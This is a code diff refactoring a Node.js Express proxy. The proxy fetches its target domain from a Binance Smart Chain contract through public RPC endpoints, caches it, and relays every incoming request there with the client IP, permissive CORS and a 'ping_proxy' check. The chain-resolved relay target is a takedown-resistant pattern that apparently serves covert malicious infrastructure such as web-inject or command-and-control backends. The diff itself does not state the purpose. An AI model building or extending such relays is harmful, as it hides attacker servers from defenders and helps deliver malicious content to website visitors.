@@ -1,34 +1,33 @@
 import express from "express";
-import fetch from "node-fetch";
 import { readFile, writeFile } from "fs/promises";
 import { tmpdir } from "os";
 import { join } from "path";
 
 const app = express();
-app.use(express.text({ type: "*/*" })); // To capture raw body
+app.use(express.text({ type: "*/*" }));
 
-const UPDATE_INTERVAL = 60 * 1000; // 60s
-const CACHE_FILE = join(tmpdir(), "proxy_cache.json");
+// --- Settings ---
+const UPDATE_INTERVAL = 60 * 1000; // 60 seconds
 const RPC_URLS = [
   "https://binance.llamarpc.com",
   "https://bsc.drpc.org",
 ];
 const CONTRACT_ADDRESS = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
+const CACHE_FILE = join(tmpdir(), "proxy_cache.json");
 
-// --- Utility Functions ---
+// --- Utilities ---
 function getClientIP(req) {
   return (
     req.headers["cf-connecting-ip"] ||
-    req.headers["x-forwarded-for"]?.split(",")[0] ||
-    req.connection.remoteAddress
+    (req.headers["x-forwarded-for"]?.split(",")[0] ?? req.ip)
   );
 }
 
 async function loadCache() {
   try {
-    const data = JSON.parse(await readFile(CACHE_FILE, "utf-8"));
-    if (Date.now() - data.timestamp < UPDATE_INTERVAL) {
-      return data.domain;
+    const cache = JSON.parse(await readFile(CACHE_FILE, "utf-8"));
+    if (Date.now() - cache.timestamp < UPDATE_INTERVAL) {
+      return cache.domain;
     }
   } catch (_) {}
   return null;
@@ -61,10 +60,7 @@ async function fetchTargetDomain() {
     jsonrpc: "2.0",
     id: 1,
     method: "eth_call",
-    params: [
-      { to: CONTRACT_ADDRESS, data: "0x" + data },
-      "latest",
-    ],
+    params: [{ to: CONTRACT_ADDRESS, data: "0x" + data }, "latest"],
   };
 
   for (const url of RPC_URLS) {
@@ -76,9 +72,12 @@ async function fetchTargetDomain() {
       });
       const json = await res.json();
       if (!json.error) {
-        return hexToString(json.result);
+        const domain = hexToString(json.result);
+        if (domain) return domain;
       }
-    } catch (_) {}
+    } catch (e) {
+      console.error("RPC fetch failed:", e.message);
+    }
   }
   throw new Error("Could not fetch target domain");
 }
@@ -91,7 +90,7 @@ async function getTargetDomain() {
   return domain;
 }
 
-// --- Proxy Handler ---
+// --- Main Proxy Handler ---
 app.all("/", async (req, res) => {
   if (req.query.e === "ping_proxy") {
     return res.type("text").send("pong");
@@ -107,7 +106,7 @@ app.all("/", async (req, res) => {
 
     const clientIP = getClientIP(req);
 
-    // Build headers
+    // Forward headers
     const headers = { ...req.headers };
     delete headers.host;
     delete headers.origin;
@@ -118,22 +117,21 @@ app.all("/", async (req, res) => {
     const proxyRes = await fetch(url, {
       method: req.method,
       headers,
-      body: req.method !== "GET" && req.method !== "HEAD" ? req.body : undefined,
+      body: ["GET", "HEAD"].includes(req.method) ? undefined : req.body,
       redirect: "follow",
     });
 
-    // Forward status and content-type
+    // Forward status and headers
     res.status(proxyRes.status);
-    proxyRes.headers.forEach((value, key) => {
-      res.setHeader(key, value);
-    });
+    proxyRes.headers.forEach((value, key) => res.setHeader(key, value));
 
+    // Always include CORS
     res.setHeader("Access-Control-Allow-Origin", "*");
     res.setHeader("Access-Control-Allow-Methods", "GET, HEAD, POST, OPTIONS");
     res.setHeader("Access-Control-Allow-Headers", "*");
 
-    const buffer = await proxyRes.arrayBuffer();
-    res.send(Buffer.from(buffer));
+    const buffer = Buffer.from(await proxyRes.arrayBuffer());
+    res.send(buffer);
   } catch (e) {
     console.error(e);
     res.status(500).send("error: " + e.message);
